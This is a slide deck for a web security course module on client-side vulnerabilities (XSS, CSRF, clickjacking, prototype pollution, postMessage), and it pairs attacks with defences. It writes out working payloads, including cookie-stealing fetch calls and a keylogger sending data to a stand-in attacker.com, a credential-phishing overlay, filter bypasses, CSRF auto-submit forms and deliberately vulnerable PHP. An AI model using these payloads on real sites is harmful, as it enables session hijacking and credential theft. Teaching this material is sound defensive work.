#import "../../../typst-theme-emberzero/1.1.0/src/lib.typ": *

#show: athena-theme.with(
  font: "Berkeley Mono",
  config-info(
    title: [Module 04: Web Security],
    subtitle: [Client-Side Vulnerabilities],
    authors: [*Marcel Schnideritsch*],
    extra: [],
    footer: [Module 04 - Web Security],
  ),
  config-common(
    handout: false,
  ),
)

#title-slide()

#section-slide(title: "Cross-Site Scripting (XSS)")

#slide(title: "What is XSS?")[
  *Cross-Site Scripting (XSS)*

  - One of the most prevalent and dangerous web vulnerabilities
  - Attacker injects malicious scripts into web pages
  - Scripts execute in victim's browser with same privileges as legitimate code

  *Impact:*
  - Session hijacking (steal cookies)
  - Credential theft (keylogging, form hijacking)
  - Phishing (fake login forms)
  - Malware distribution
  - Complete application control
]

#slide(title: "Why XSS is Dangerous")[
  #set text(size: 18pt)
  *What attackers can do:*
  1. Steal session cookies → Impersonate users
  2. Capture keystrokes → Steal passwords
  3. Modify page content → Phishing attacks
  4. Redirect to malicious sites
  5. Execute any action user can perform
  6. Propagate (XSS worms in stored XSS)
  7. Cryptocurrency mining
  8. Access sensitive data
  9. Deface website
  10. Install backdoors
]

#slide(title: "Three Types of XSS")[
  #table(
    columns: (auto, auto, auto),
    inset: 8pt,
    stroke: 0.5pt,
    align: left,
    [*Type*], [*Characteristics*], [*Example*],
    [*Reflected*], [Non-persistent\ Single request/response\ Requires victim to click link], [Malicious URL parameter],
    [*Stored*], [Persistent\ Stored on server\ Executes automatically], [Comment system\ User profile],
    [*DOM-based*], [Client-side only\ Never sent to server\ JavaScript vulnerability], [location.hash processing],
  )
]

#section-slide(title: "Reflected XSS")

#slide(title: "Reflected XSS")[
  *Definition:* Malicious script embedded in request and immediately reflected in response

  *Example Vulnerable Code:*
  ```php
  <?php
  $query = $_GET['q'];
  echo "<h1>Results for: " . $query . "</h1>";
  ?>
  ```

  *Attack URL:*
  ```
  https://example.com/search?q=<script>alert(document.cookie)</script>
  ```

  *Result:* Script executes when victim clicks link
]

#slide(title: "Reflected XSS Attack Flow")[
  1. *Attacker crafts malicious URL*:
     ```
     https://bank.com/search?q=<script>
     fetch('https://attacker.com/steal?c='+document.cookie)
     </script>
     ```

  2. *Attacker sends URL to victim* (phishing, social media)

  3. *Victim clicks link*

  4. *Script executes in victim's browser*

  5. *Cookie sent to attacker's server*

  6. *Attacker hijacks session*
]

#section-slide(title: "Stored XSS")

#slide(title: "Stored XSS (Persistent)")[
  *Definition:* Malicious script permanently stored on server

  *Example Vulnerable Code:*
  ```php
  <?php
  // Save comment (no sanitization)
  $comment = $_POST['comment'];
  $db->query("INSERT INTO comments (text) VALUES ('$comment')");

  // Display comments
  foreach ($comments as $comment) {
      echo "<div>" . $comment['text'] . "</div>";
  }
  ?>
  ```

  *Most dangerous type* - executes for all users automatically!
]

#slide(title: "Stored XSS Impact")[
  *Attack Scenario:*
  - Attacker submits malicious comment
  - Comment stored in database
  - Every user viewing page executes script
  - All users' cookies stolen automatically

  *Real-World Example:*
  - MySpace Samy Worm (2005)
  - Self-replicating XSS
  - Added attacker as friend to all profiles
  - 1 million friends in 20 hours
]

#slide(title: "Stored XSS Attack Vectors")[
  *Common locations:*
  - Comment systems
  - User profiles (bio, username, website)
  - Forum posts
  - Product reviews
  - Contact forms (stored in admin panel!)
  - File uploads (SVG with embedded script)
  - Chat applications
  - Wiki pages

  *Any user-generated content is potential vector!*
]

#section-slide(title: "DOM-based XSS")

#slide(title: "DOM-based XSS")[
  *Definition:* Vulnerability in client-side JavaScript that modifies DOM

  *Characteristics:*
  - Payload never sent to server
  - Executed entirely in browser
  - Server-side filters ineffective
  - Harder to detect with traditional tools

  *Sources:* `location.hash`, `location.search`, `postMessage` \
  *Sinks:* `innerHTML`, `eval()`, `document.write()`
]

#slide(title: "DOM XSS Example")[
  *Vulnerable JavaScript:*
  ```javascript
  // Read from URL fragment
  var name = location.hash.substring(1);

  // VULNERABLE: Directly insert into DOM
  document.getElementById('welcome').innerHTML = 'Welcome ' + name;
  ```

  *Attack URL:*
  ```
  https://example.com/#<img src=x onerror=alert(1)>
  ```

  *Result:* Script executes without server involvement
]

#slide(title: "DOM XSS Sources & Sinks")[
  *Sources (input):*
  - `location.hash`, `location.search`
  - `document.URL`, `document.referrer`
  - `postMessage` data
  - `localStorage`, `sessionStorage`

  *Sinks (dangerous functions):*
  - `innerHTML`, `outerHTML`
  - `document.write()`, `document.writeln()`
  - `eval()`, `Function()`, `setTimeout(string)`
  - `element.src`, `element.href`
  - jQuery: `$()`, `.html()`, `.append()`
]

#section-slide(title: "XSS Exploitation & Payloads")

#slide(title: "Basic XSS Payloads")[
  *Alert (proof of concept):*
  ```html
  <script>alert(document.domain)</script>
  ```

  *Cookie theft:*
  ```html
  <script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
  </script>
  ```

  *Image tag (no script tags):*
  ```html
  <img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
  ```

  *SVG:*
  ```html
  <svg onload="alert(1)">
  ```
]

#slide(title: "Advanced XSS Exploitation")[
  #local(inset: 0.12em)[
  *Keylogger:*
  ```javascript
  document.onkeypress = function(e) {
    fetch('https://attacker.com/keys', {
      method: 'POST',
      body: e.key
    });
  };
  ```

  *Phishing overlay:*
  ```javascript
  document.body.innerHTML = `
    <div style="position:fixed;top:0;left:0;width:100%;height:100%">
      <h1>Session Expired</h1>
      <form action="https://attacker.com/phish" method="POST">
        Username: <input name="user"><br>
        Password: <input type="password" name="pass"><br>
        <button>Login</button>
      </form>
    </div>
  `;
  ```
  ]
]

#slide(title: "XSS Filter Bypasses")[
  #set text(size: 18pt)
  *Case manipulation:*
  ```html
  <ScRiPt>alert(1)</sCrIpT>
  ```

  *HTML encoding:*
  ```html
  <img src=x onerror="&#97;&#108;&#101;&#114;&#116;(1)">
  ```

  *Incomplete filter bypass:*
  ```html
  <scr<script>ipt>alert(1)</script>
  <!-- After removal: <script>alert(1)</script> -->
  ```

  *Alternative tags/events:*
  ```html
  <body onload=alert(1)>
  <input onfocus=alert(1) autofocus>
  <details open ontoggle=alert(1)>
  ```
]

#section-slide(title: "XSS Prevention")

#slide(title: "XSS Prevention Strategies")[
  1. *Output Encoding* (context-aware)
  2. *Input Validation* (whitelist approach)
  3. *Use Safe APIs* (`textContent` instead of `innerHTML`)
  4. *Content Security Policy* (CSP)
  5. *HTTPOnly Cookies*
  6. *Template Engines* with auto-escaping
  7. *Framework Protection* (React, Vue, Angular)
]

#slide(title: "Output Encoding (Context-Aware)")[
  #local(inset: 0.12em)[
  *HTML Context:*
  ```javascript
  function encodeHTML(str) {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }
  ```

  *JavaScript Context:*
  ```javascript
  const encoded = userInput
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"');
  ```

  *URL Context:*
  ```javascript
  const encoded = encodeURIComponent(userInput);
  ```
  ]
]

#slide(title: "Safe APIs")[
  *SAFE:*
  ```javascript
  element.textContent = userInput;  // Safe
  element.setAttribute('data-value', userInput);  // Safe for data-*
  ```

  *UNSAFE:*
  ```javascript
  element.innerHTML = userInput;  // Dangerous!
  element.outerHTML = userInput;  // Dangerous!
  eval(userInput);  // Extremely dangerous!
  ```

  *React (auto-escaping):*
  ```jsx
  <div>{userInput}</div>  // Automatically escaped
  ```
]

#slide(title: "Content Security Policy for XSS")[
  #set text(size: 16pt)
  *Strict CSP:*
  ```http
  Content-Security-Policy:
    default-src 'self';
    script-src 'nonce-random123' 'strict-dynamic';
    object-src 'none';
  ```

  *HTML with nonce:*
  ```html
  <script nonce="random123">
    // Allowed
  </script>

  <script>
    // BLOCKED (no nonce)
  </script>
  ```

  CSP blocks inline scripts and eval(), mitigating many XSS attacks
]

#section-slide(title: "Cross-Site Request Forgery (CSRF)")

#slide(title: "What is CSRF?")[
  *Cross-Site Request Forgery*

  - Tricks authenticated user into executing unwanted actions
  - Exploits browser's automatic inclusion of cookies
  - Attacker cannot read response, only trigger action

  *Prerequisites:*
  1. User is authenticated (has session cookie)
  2. Application uses cookie-based authentication
  3. No unpredictable parameters in request
]

#slide(title: "CSRF Attack Example")[
  *Vulnerable Endpoint:*
  ```
  GET /transfer?to=attacker&amount=1000
  ```

  *Attack (on attacker's website):*
  ```html
  <img src="https://bank.com/transfer?to=attacker&amount=1000">
  ```

  *What happens:*
  1. Victim visits attacker's site
  2. Image tag triggers request to bank.com
  3. Browser automatically includes session cookie
  4. Request executes with victim's privileges
  5. Money transferred to attacker!
]

#slide(title: "CSRF Attack Vectors")[
  #set text(size: 14pt)
  *GET Request (simple):*
  ```html
  <img src="https://bank.com/delete-account">
  ```

  *POST Request (auto-submit form):*
  ```html
  <form id="csrf" action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
  </form>
  <script>document.getElementById('csrf').submit();</script>
  ```

  *AJAX Request:*
  ```javascript
  fetch('https://bank.com/change-email', {
    method: 'POST',
    credentials: 'include',  // Include cookies
    body: 'email=attacker@evil.com'
  });
  ```
]

#section-slide(title: "CSRF Prevention")

#slide(title: "CSRF Defense Mechanisms")[
  1. *CSRF Tokens* (synchronizer token pattern)
  2. *SameSite Cookies*
  3. *Custom Headers* (trigger CORS preflight)
  4. *Double-Submit Cookie Pattern*
  5. *Referer/Origin Validation* (unreliable alone)

  *Best Practice:* Use multiple layers!
]

#slide(title: "CSRF Tokens")[
  #local(inset: 0.12em)[
  *Server-side:*
  ```php
  // Generate token
  $token = bin2hex(random_bytes(32));
  $_SESSION['csrf_token'] = $token;

  // Verify token
  if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
      die('CSRF token validation failed');
  }
  ```

  *Client-side:*
  ```html
  <form method="POST" action="/transfer">
    <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>">
    <input name="to">
    <input name="amount">
    <button>Transfer</button>
  </form>
  ```
  ]
]

#slide(title: "SameSite Cookies")[
  ```http
  Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
  ```

  #table(
    columns: (auto, auto, auto, auto),
    inset: 6pt,
    stroke: 0.5pt,
    [*Scenario*], [*Strict*], [*Lax*], [*None*],
    [Link from external], [❌], [✅], [✅],
    [Form POST from external], [❌], [❌], [✅],
    [AJAX from external], [❌], [❌], [✅],
  )

  - *Strict*: Best CSRF protection
  - *Lax*: Good balance (default in modern browsers)
  - *None*: No protection
]

#section-slide(title: "Clickjacking")

#slide(title: "What is Clickjacking?")[
  *Clickjacking (UI Redressing)*

  - Tricks users into clicking something different from what they perceive
  - Attacker overlays invisible iframe over deceptive content
  - User thinks they're clicking legitimate button

  *Impact:*
  - Delete account
  - Transfer money
  - Change settings
  - Grant permissions (camera, microphone)
  - Like/follow (likejacking)
]

#slide(title: "Clickjacking Attack")[
  #local(inset: 0.12em)[
  *Attacker's page:*
  ```html
  <style>
    iframe {
      position: absolute;
      top: 100px;
      left: 200px;
      opacity: 0.0001;  /* Nearly invisible */
      z-index: 2;
    }
    button {
      position: absolute;
      top: 200px;
      left: 350px;
      z-index: 1;
    }
  </style>
  <iframe src="https://bank.com/delete-account"></iframe>
  <button>Click for FREE iPHONE!</button>
  ```

  User clicks "FREE iPHONE" but actually clicks delete account button!
  ]
]

#slide(title: "Clickjacking Prevention")[
  #set text(size: 18pt)
  *X-Frame-Options:*
  ```http
  X-Frame-Options: DENY
  ```
  Cannot be embedded in any frame

  ```http
  X-Frame-Options: SAMEORIGIN
  ```
  Can only be framed by same origin

  *CSP frame-ancestors (modern):*
  ```http
  Content-Security-Policy: frame-ancestors 'none'
  ```

  *JavaScript frame-busting (unreliable):*
  ```javascript
  if (top !== self) {
    top.location = self.location;
  }
  ```
]

#section-slide(title: "Other Client-Side Vulnerabilities")

#slide(title: "DOM Clobbering")[
  #set text(size: 18pt)
  *Definition:* Exploiting browser's behavior of creating global variables for HTML elements

  *Vulnerable Code:*
  ```javascript
  if (config.admin) {
    // Grant admin access
  }
  ```

  *Attack:*
  ```html
  <form id="config">
    <input name="admin" value="true">
  </form>
  ```

  *Result:* `config.admin` reads from DOM, not expected object!

  *Prevention:* Use `const`/`let`, validate types
]

#slide(title: "Prototype Pollution")[
  #set text(size: 15pt)
  *Definition:* Modifying JavaScript object prototypes

  *Vulnerable Code:*
  ```javascript
  function merge(target, source) {
    for (let key in source) {
      target[key] = source[key];  // VULNERABLE
    }
  }
  ```

  *Attack:*
  ```javascript
  merge({}, JSON.parse('{"__proto__": {"admin": true}}'));

  // Now ALL objects have admin property!
  let user = {};
  console.log(user.admin);  // true
  ```

  *Prevention:* Check for `__proto__`, `constructor`, `prototype`
]

#slide(title: "postMessage Vulnerabilities")[
  #local(inset: 0.12em)[
  #set text(size: 18pt)
  *Vulnerable Receiver:*
  ```javascript
  window.addEventListener('message', function(e) {
    // VULNERABLE: No origin check!
    eval(e.data);
  });
  ```

  *Attack:*
  ```javascript
  targetWindow.postMessage('alert(document.cookie)', '*');
  ```

  *Secure Implementation:*
  ```javascript
  window.addEventListener('message', function(e) {
    // Validate origin
    if (e.origin !== 'https://trusted.com') return;

    // Validate data type
    if (typeof e.data !== 'string') return;

    // Safe processing
    processMessage(e.data);
  });
  ```
  ]
]

#section-slide(title: "Key Takeaways")

#slide(title: "Summary")[
  - *XSS* remains one of the most critical vulnerabilities
  - Three main types: Reflected, Stored, DOM-based
  - Always encode output based on context
  - Use CSP and HTTPOnly cookies as defense-in-depth
  - *CSRF* requires both prevention mechanisms and secure coding
  - *SameSite cookies* provide strong CSRF protection
  - *Clickjacking* needs frame-ancestors CSP or X-Frame-Options
  - Modern JavaScript introduces new vectors (Prototype Pollution, DOM Clobbering)
  - *postMessage* requires explicit origin validation
  - Defense requires multiple layers
]

#slide(title: "Defense Checklist")[
  ✅ *Output encoding* (context-aware) \
  ✅ *Input validation* (whitelist) \
  ✅ *CSP* with nonces (no unsafe-inline) \
  ✅ *HTTPOnly, Secure, SameSite* cookies \
  ✅ *CSRF tokens* on state-changing operations \
  ✅ *X-Frame-Options* or CSP frame-ancestors \
  ✅ *Safe APIs* (textContent, not innerHTML) \
  ✅ *Framework protection* (React, Vue auto-escaping) \
  ✅ *Security testing* (manual + automated) \
  ✅ *Security training* for developers
]

#slide(title: "Resources")[
  #set text(size: 15pt)
  *Learning:*
  - OWASP XSS Guide
  - PortSwigger Web Security Academy
  - Google XSS Game

  *Tools:*
  - Burp Suite (XSS & CSRF testing)
  - OWASP ZAP (automated scanning)
  - XSStrike (advanced XSS detection)
  - DOMPurify (HTML sanitization)
  - CSP Evaluator

  *Practice:*
  - PortSwigger Labs
  - DVWA
  - bWAPP
  - HackTheBox
]

#title-slide(
  author: [Marcel Schnideritsch],
  title: [Client-Side Vulnerabilities],
  subtitle: [Module 04 - Web Security],
)
